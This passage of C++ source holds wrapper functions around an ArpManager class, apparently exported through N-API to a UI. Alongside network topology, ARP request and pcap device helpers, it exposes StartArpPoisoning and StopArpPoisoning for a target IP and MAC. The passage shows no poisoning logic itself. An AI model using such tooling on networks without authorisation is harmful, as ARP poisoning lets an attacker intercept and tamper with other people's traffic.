    if (!g_arp_manager) {
        g_arp_manager = std::make_unique<ArpManager>();
    }
    return g_arp_manager->initialize(adapter_name);
}

void CleanupArpManager() {
    if (g_arp_manager) {
        g_arp_manager->cleanup();
    }
}

NetworkInfo GetNetworkTopology() {
    if (!g_arp_manager) {
        return NetworkInfo{};
    }
    // Return the stored network_info from the initialized ArpManager
    // This ensures the UI gets the validated topology with proper gateway MAC
    return g_arp_manager->getNetworkInfo();
}

bool SendArpRequest(const std::string& target_ip) {
    if (!g_arp_manager) {
        return false;
    }
    return g_arp_manager->sendArpRequest(target_ip);
}

ArpManager::PerformanceStats GetArpPerformanceStats() {
    if (!g_arp_manager) {
        return ArpManager::PerformanceStats{};
    }
    return g_arp_manager->getPerformanceStats();
}

// Phase 2 C++ function implementations for N-API exports
bool StartArpPoisoning(const std::string& target_ip, const std::string& target_mac) {
    if (!g_arp_manager) {
        return false;
    }
    return g_arp_manager->startArpPoisoning(target_ip, target_mac);
}

bool StopArpPoisoning(const std::string& target_ip) {
    if (!g_arp_manager) {
        return false;
    }
    return g_arp_manager->stopArpPoisoning(target_ip);
}

std::vector<std::string> EnumeratePcapDevices() {
    if (!g_arp_manager) {
        g_arp_manager = std::make_unique<ArpManager>();
    }
    return g_arp_manager->enumeratePcapDevices();
}